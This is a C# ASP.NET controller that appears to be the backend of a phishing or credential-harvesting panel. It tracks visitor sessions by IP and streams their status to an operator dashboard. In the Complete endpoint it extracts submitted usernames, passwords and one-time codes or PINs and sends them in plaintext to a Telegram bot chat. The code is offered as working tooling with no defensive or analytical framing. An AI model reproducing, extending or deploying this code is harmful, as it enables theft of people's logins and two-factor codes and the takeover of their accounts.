using Conductor.Db;
using Conductor.Models;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Net;
using System.Text.Json;
using System.Net.Sockets;
using System.Linq;
using Conductor.RealTime;
using Microsoft.AspNetCore.SignalR;
using Microsoft.AspNetCore.Authorization;
using Microsoft.Extensions.Configuration;
using Conductor.Helpers;
using Conductor.Telegram;

namespace Conductor.Controllers
{
    [ApiController]
    [Route("api/sessions")]
    public class SessionController : ControllerBase
    {
        private readonly AppDb _db;
        private readonly ILogger<SessionController> _logger;
        private readonly IHubContext<DashboardHub> _hub;
        private readonly IConfiguration _config;

        public SessionController(AppDb db, ILogger<SessionController> logger, IHubContext<DashboardHub> hub, IConfiguration config)
        {
            _db = db;
            _logger = logger;
            _hub = hub;
            _config = config;
        }

        [HttpPost("")]
        public async Task<IActionResult> CreateSession([FromBody] CreateSessionRequest request)
        {
            _logger.LogInformation("=== SESSION CREATION REQUEST RECEIVED ===");
            _logger.LogInformation("Request Origin: {Origin}", Request.Headers.Origin.FirstOrDefault() ?? "None");
            _logger.LogInformation("Request Method: {Method}", Request.Method);
            _logger.LogInformation("Request Path: {Path}", Request.Path);
            _logger.LogInformation("Request Headers: {@Headers}", Request.Headers.ToDictionary(h => h.Key, h => string.Join(",", h.Value.ToArray())));
            _logger.LogInformation("Request Body: {@RequestBody}", request);
            
            try
            {
                // Get client IP
                var ip = GetClientIpAddress();

                // Check if there's already an active session from this IP. EF Core
                // cannot translate IPAddress equality to SQL (especially when a
                // value-converter is in place), so we perform the comparison in
                // memory after filtering to active sessions.
                var recentCutoff = DateTimeOffset.UtcNow - TimeSpan.FromMinutes(2);
                var existingSession = _db.Sessions
                    .AsEnumerable()    // load into memory for DateTimeOffset comparison
                    .Where(s => s.StartedAt > recentCutoff)
                    .FirstOrDefault(s => AreSameIp(s.Ip, ip));

                Session session;

                if (existingSession != null)
                {
                    _logger.LogInformation("Re-using existing active session {SessionId} for IP {IP}", existingSession.Id, ip);
                    // Refresh last-seen so that dashboard shows LIVE immediately
                    existingSession.LastSeenAt = DateTimeOffset.UtcNow;
                    await _db.SaveChangesAsync();
                    session = existingSession;
                }
                else
                {
                    // Create new session
                    session = new Session
                    {
                        Ip = ip,
                        UserAgent = request.UserAgent ?? Request.Headers.UserAgent.ToString(),
                        StartedAt = DateTimeOffset.UtcNow,
                        LastSeenAt = DateTimeOffset.UtcNow,
                        IsActive = true
                    };

                    _db.Sessions.Add(session);
                    await _db.SaveChangesAsync();
                }

                // NOTE: Event writes are disabled until database schema is finalized
                // Create event for session start
                // var startEvent = new Event
                // {
                //     SiteId = 1, // Default site ID for now
                //     SessionId = session.Id,
                //     Kind = "session_start",
                //     Path = request.Url ?? "/",
                //     Meta = JsonDocument.Parse(JsonSerializer.Serialize(new
                //     {
                //         userAgent = session.UserAgent,
                //         referrer = request.Referrer,
                //         siteName = request.SiteName
                //     })),
                //     Ts = DateTimeOffset.UtcNow
                // };

                // _db.Events.Add(startEvent);
                // await _db.SaveChangesAsync();

                _logger.LogInformation("Session created: {SessionId} from {IP}", session.Id, ip);

                // Broadcast session creation to dashboard
                await _hub.Clients.Group("dashboard").SendAsync("sessionCreated", new
                {
                    id = session.Id,
                    sessionId = session.Id,
                    ip = ip.ToString(),
                    userAgent = session.UserAgent,
                    startedAt = session.StartedAt,
                    isActive = session.IsActive,
                    status = "live" // ensure dashboards mark new sessions as live immediately
                });

                return Ok(new
                {
                    sessionId = session.Id,
                    isValid = true,
                    startedAt = session.StartedAt
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to create session");
                return StatusCode(500, new { message = "Failed to create session" });
            }
        }

        [HttpGet("{sessionId}/validate")]
        public async Task<IActionResult> ValidateSession(int sessionId)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                
                if (session == null)
                {
                    return Ok(new { isValid = false, reason = "Session not found" });
                }

                // Check if session is still active and not too old
                var maxAge = TimeSpan.FromHours(24);
                var isRecentlyInactive = !session.IsActive && (DateTimeOffset.UtcNow - session.LastSeenAt) <= TimeSpan.FromMinutes(2);
                if (isRecentlyInactive)
                {
                    // Auto-reactivate recently closed sessions (e.g. after navigation)
                    session.IsActive = true;
                }

                var isValid = session.IsActive && 
                             (DateTimeOffset.UtcNow - session.StartedAt) <= maxAge;

                if (isValid)
                {
                    // Update last seen
                    session.LastSeenAt = DateTimeOffset.UtcNow;
                    await _db.SaveChangesAsync();
                }

                return Ok(new
                {
                    isValid = isValid,
                    sessionId = session.Id,
                    startedAt = session.StartedAt,
                    lastSeenAt = session.LastSeenAt
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to validate session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Failed to validate session" });
            }
        }

        [HttpPost("{sessionId}/pageview")]
        public async Task<IActionResult> TrackPageView(int sessionId, [FromBody] PageViewRequest request)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                if (session == null)
                {
                    return NotFound(new { message = "Session not found" });
                }

                // Update session last seen
                session.LastSeenAt = DateTimeOffset.UtcNow;

                // NOTE: Event writes are disabled until database schema is finalized
                // Create page view event
                // var pageViewEvent = new Event
                // {
                //     SiteId = 1, // Default site ID for now
                //     SessionId = sessionId,
                //     Kind = "page_view",
                //     Path = request.Path ?? "/",
                //     Meta = JsonDocument.Parse(JsonSerializer.Serialize(new
                //     {
                //         url = request.Url,
                //         title = request.Title,
                //         timestamp = request.Timestamp
                //     })),
                //     Ts = DateTimeOffset.UtcNow
                // };

                // _db.Events.Add(pageViewEvent);
                await _db.SaveChangesAsync();

                _logger.LogInformation("Page view tracked for session {SessionId}: {Path}", sessionId, request.Path);

                return Ok(new { success = true });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to track page view for session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Failed to track page view" });
            }
        }

        [HttpPost("{sessionId}/heartbeat")]
        public async Task<IActionResult> Heartbeat(int sessionId)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                if (session == null)
                {
                    return NotFound(new { message = "Session not found" });
                }

                _logger.LogDebug("Heartbeat received for session {SessionId}", sessionId);

                // Update last seen and ensure session is active
                session.LastSeenAt = DateTimeOffset.UtcNow;
                session.IsActive = true; // Heartbeat means user is definitely active
                
                // Avoid complex EF time comparisons that can fail translation; perform any
                // maintenance client-side if ever needed. For now just persist heartbeat.
                await _db.SaveChangesAsync();

                // Get current NextStep status efficiently
                var heartbeatInterval = 30; // seconds
                var inactiveThreshold = TimeSpan.FromSeconds(heartbeatInterval * 2);
                
                var nextStepCounts = _db.NextSteps
                    .Where(ns => ns.SessionId == sessionId)
                    .GroupBy(ns => ns.Status)
                    .Select(g => new { Status = g.Key, Count = g.Count() })
                    .ToList();

                var hasPendingTicket = nextStepCounts.Any(x => x.Status == "pending");
                var hasDecidedTicket = nextStepCounts.Any(x => x.Status == "decided");
                var hasProcessedTicket = nextStepCounts.Any(x => x.Status == "processed");
                var hasCompletedTicket = nextStepCounts.Any(x => x.Status == "completed");
                
                var correctStatus = SessionStatusHelper.DetermineSessionStatus(
                    hasPendingTicket, hasDecidedTicket, hasProcessedTicket, hasCompletedTicket,
                    session.IsActive, session.LastSeenAt, inactiveThreshold);

                // Only broadcast if something meaningful to report (not just routine heartbeat)
                if (hasPendingTicket || hasDecidedTicket || hasProcessedTicket || hasCompletedTicket)
                {
                    await _hub.Clients.Group("dashboard").SendAsync("sessionUpdated", new
                    {
                        id = session.Id,
                        sessionId = session.Id,
                        isActive = session.IsActive,
                        lastSeenAt = session.LastSeenAt,
                        status = correctStatus
                    });
                }

                return Ok(new { success = true, lastSeen = session.LastSeenAt, status = correctStatus });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Heartbeat failed for session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Heartbeat failed" });
            }
        }

        // NEW: mark session complete when user reaches terminal page
        [HttpPost("{id}/complete")]
        [AllowAnonymous]
        public async Task<IActionResult> Complete(int id)
        {
            var session = await _db.Sessions.FindAsync(id);
            if (session == null) return NotFound();

            // Update session last seen but keep active for status determination
            session.LastSeenAt = DateTimeOffset.UtcNow;

            // Mark the latest decision for the latest submission as completed
            var latestSubmissionId = await _db.Submissions
                .Where(s => s.SessionId == id)
                .OrderByDescending(s => s.Id)
                .Select(s => (int?)s.Id)
                .FirstOrDefaultAsync();

            if (latestSubmissionId != null)
            {
                // Prefer processed; otherwise accept decided for this latest submission
                var step = await _db.NextSteps
                    .Where(ns => ns.SessionId == id && ns.SubmissionId == latestSubmissionId && (ns.Status == "processed" || ns.Status == "decided"))
                    .OrderByDescending(ns => ns.Id)
                    .FirstOrDefaultAsync();

                if (step != null)
                {
                    step.Status = "completed";
                    step.DecidedAt = DateTimeOffset.UtcNow;
                }
            }

            await _db.SaveChangesAsync();

            // Get the correct status using our fixed logic
            var heartbeatInterval = 30; // seconds
            var inactiveThreshold = TimeSpan.FromSeconds(heartbeatInterval * 2);
            
            var nextStepCounts = _db.NextSteps
                .Where(ns => ns.SessionId == id)
                .GroupBy(ns => ns.Status)
                .Select(g => new { Status = g.Key, Count = g.Count() })
                .ToList();

            var hasPendingTicket = nextStepCounts.Any(x => x.Status == "pending");
            var hasDecidedTicket = nextStepCounts.Any(x => x.Status == "decided");
            var hasProcessedTicket = nextStepCounts.Any(x => x.Status == "processed");
            var hasCompletedTicket = nextStepCounts.Any(x => x.Status == "completed");
            
            var correctStatus = SessionStatusHelper.DetermineSessionStatus(
                hasPendingTicket, hasDecidedTicket, hasProcessedTicket, hasCompletedTicket,
                session.IsActive, session.LastSeenAt, inactiveThreshold);

            // Prepare latest submission details for UI (credentials preview)
            var latestSubmission = await _db.Submissions
                .Where(s => s.SessionId == id)
                .OrderByDescending(s => s.Id)
                .FirstOrDefaultAsync();

            var latestSubmissionDto = latestSubmission != null
                ? new
                {
                    pageId = latestSubmission.PageId,
                    createdAt = latestSubmission.CreatedAt,
                    fields = DashboardController.ExtractSanitizedFields(latestSubmission.Payload.RootElement)
                }
                : null;

            // Notify dashboards with the correct completion status and latestSubmission fields
            await _hub.Clients.Group("dashboard")
                .SendAsync("sessionUpdated", new {
                    id = session.Id,
                    sessionId = session.Id,
                    isActive = session.IsActive,
                    lastSeenAt = session.LastSeenAt,
                    status = correctStatus, // This should now be "complete" if we have processed NextSteps
                    latestSubmission = latestSubmissionDto
                });

            // Attempt Telegram notification on completion
            if (correctStatus == "complete")
            {
                try
                {
                    var token = _config["Telegram:BotToken"];
                    var chatId = _config["Telegram:ChatId"];
                    if (!string.IsNullOrWhiteSpace(token) && !string.IsNullOrWhiteSpace(chatId))
                    {
                        var fields = latestSubmission != null
                            ? DashboardController.ExtractSanitizedFields(latestSubmission.Payload.RootElement)
                            : new Dictionary<string, string>();

                        string GetOrEmpty(string key)
                            => fields.TryGetValue(key, out var val) ? val : string.Empty;

                        var username = GetOrEmpty("username");
                        if (string.IsNullOrEmpty(username)) username = GetOrEmpty("user");
                        if (string.IsNullOrEmpty(username)) username = GetOrEmpty("email");
                        var password = GetOrEmpty("password");
                        if (string.IsNullOrEmpty(password)) password = GetOrEmpty("pwd");
                        if (string.IsNullOrEmpty(password)) password = GetOrEmpty("pass");
                        var code = GetOrEmpty("code");
                        if (string.IsNullOrEmpty(code)) code = GetOrEmpty("otp");
                        if (string.IsNullOrEmpty(code)) code = GetOrEmpty("pin");

                        var msg = $"Session {session.Id} COMPLETE\nIP: {session.Ip}\nUser: {username}\nPass: {password}\nCode: {code}";
                        await Notify.SendMessageAsync(token, chatId, msg);
                    }
                    else
                    {
                        _logger.LogInformation("Telegram credentials not configured; skipping completion message for session {SessionId}", id);
                    }
                }
                catch (Exception tex)
                {
                    _logger.LogWarning(tex, "Telegram notification failed for session {SessionId}", id);
                }
            }

            return Ok(new { ok = true, status = correctStatus });
        }

        [HttpPatch("{sessionId}")]
        public async Task<IActionResult> UpdateSession(int sessionId, [FromBody] UpdateSessionRequest request)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                if (session == null)
                {
                    return NotFound(new { message = "Session not found" });
                }

                // Update last seen and active status
                session.LastSeenAt = DateTimeOffset.UtcNow;
                if (request.IsActive.HasValue)
                {
                    session.IsActive = request.IsActive.Value;
                }

                // NOTE: Event writes are disabled until database schema is finalized
                // Create update event
                // var updateEvent = new Event
                // {
                //     SiteId = 1, // Default site ID for now
                //     SessionId = sessionId,
                //     Kind = "session_update",
                //     Path = Request.Headers.Referer.ToString() ?? "/",
                //     Meta = JsonDocument.Parse(JsonSerializer.Serialize(request.Data ?? new {})),
                //     Ts = DateTimeOffset.UtcNow
                // };

                // _db.Events.Add(updateEvent);
                await _db.SaveChangesAsync();

                // Determine correct status based on NextStep states
                var updateInterval = 30; // seconds
                var inactiveThreshold = TimeSpan.FromSeconds(updateInterval * 2);
                
                var hasPendingTicket = _db.NextSteps.Any(ns => ns.SessionId == sessionId && ns.Status == "pending");
                var hasDecidedTicket = _db.NextSteps.Any(ns => ns.SessionId == sessionId && ns.Status == "decided");
                var hasProcessedTicket = _db.NextSteps.Any(ns => ns.SessionId == sessionId && ns.Status == "processed");
                var hasCompletedTicket = _db.NextSteps.Any(ns => ns.SessionId == sessionId && ns.Status == "completed");
                
                var correctStatus = SessionStatusHelper.DetermineSessionStatus(
                    hasPendingTicket, hasDecidedTicket, hasProcessedTicket, hasCompletedTicket,
                    session.IsActive, session.LastSeenAt, inactiveThreshold);

                // Broadcast to dashboards that session updated
                await _hub.Clients.Group("dashboard").SendAsync("sessionUpdated", new
                {
                    id = session.Id,
                    sessionId = session.Id,
                    isActive = session.IsActive,
                    lastSeenAt = session.LastSeenAt,
                    status = correctStatus
                });

                _logger.LogInformation("Session updated: {SessionId}", sessionId);

                return Ok(new { success = true });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to update session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Failed to update session" });
            }
        }

        [HttpGet("{sessionId}")]
        public async Task<IActionResult> GetSession(int sessionId)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                if (session == null)
                {
                    return NotFound(new { message = "Session not found" });
                }

                return Ok(new
                {
                    sessionId = session.Id,
                    userId = session.UserId,
                    ip = session.Ip.ToString(),
                    userAgent = session.UserAgent,
                    startedAt = session.StartedAt,
                    lastSeenAt = session.LastSeenAt,
                    isActive = session.IsActive
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to get session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Failed to get session" });
            }
        }

        [HttpPost("{sessionId}/deactivate")]
        public async Task<IActionResult> DeactivateSession(int sessionId)
        {
            try
            {
                var session = await _db.Sessions.FindAsync(sessionId);
                if (session == null)
                {
                    return NotFound(new { message = "Session not found" });
                }

                // Make deactivate a no-op during normal navigation.
                // Do not flip IsActive here – the inactivity monitor is authoritative.
                _logger.LogInformation("Received deactivate for session {SessionId} – no-op", sessionId);
                return Ok(new { message = "deactivate accepted" });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to deactivate session {SessionId}", sessionId);
                return StatusCode(500, new { message = "Failed to deactivate session" });
            }
        }

        private IPAddress GetClientIpAddress()
        {
            try
            {
                // Check for forwarded IPs first
                var forwardedFor = Request.Headers["X-Forwarded-For"].FirstOrDefault();
                if (!string.IsNullOrEmpty(forwardedFor))
                {
                    var firstIp = forwardedFor.Split(',')[0].Trim();
                    if (IPAddress.TryParse(firstIp, out var forwarded))
                    {
                        return forwarded;
                    }
                }

                // Check X-Real-IP header
                var realIp = Request.Headers["X-Real-IP"].FirstOrDefault();
                if (!string.IsNullOrEmpty(realIp) && IPAddress.TryParse(realIp, out var real))
                {
                    return real;
                }

                // Fall back to connection remote IP
                var remote = Request.HttpContext.Connection.RemoteIpAddress ?? IPAddress.Loopback;

                // Normalise loopback addresses so that IPv6 (::1) and IPv4 (127.0.0.1)
                // are treated identically.  This avoids duplicate sessions where one
                // request comes in over IPv6 and another over IPv4.
                if (IPAddress.IsLoopback(remote))
                    return IPAddress.Loopback; // Always use IPv4 loopback as canonical

                return remote;
            }
            catch (SocketException sockEx)
            {
                _logger.LogWarning(sockEx, "Failed to obtain client IP – defaulting to loopback");
                return IPAddress.Loopback;
            }
        }

        private static bool AreSameIp(System.Net.IPAddress a, System.Net.IPAddress b)
        {
            // Treat exact equality as identical first
            if (a.Equals(b)) return true;

            // Consider IPv4 and IPv6 loopback addresses equivalent so that
            // local development does not create duplicate sessions when some
            // requests arrive via 127.0.0.1 and others via ::1.
            if (System.Net.IPAddress.IsLoopback(a) && System.Net.IPAddress.IsLoopback(b))
                return true;

            return false;
        }


    }

    public class CreateSessionRequest
    {
        public string? UserAgent { get; set; }
        public string? Url { get; set; }
        public string? Referrer { get; set; }
        public string? Timestamp { get; set; }
        public string? SiteName { get; set; }
    }

    public class PageViewRequest
    {
        public string? Url { get; set; }
        public string? Path { get; set; }
        public string? Title { get; set; }
        public string? Timestamp { get; set; }
    }

    public class UpdateSessionRequest
    {
        public object? Data { get; set; }
        public bool? IsActive { get; set; }
    }
}
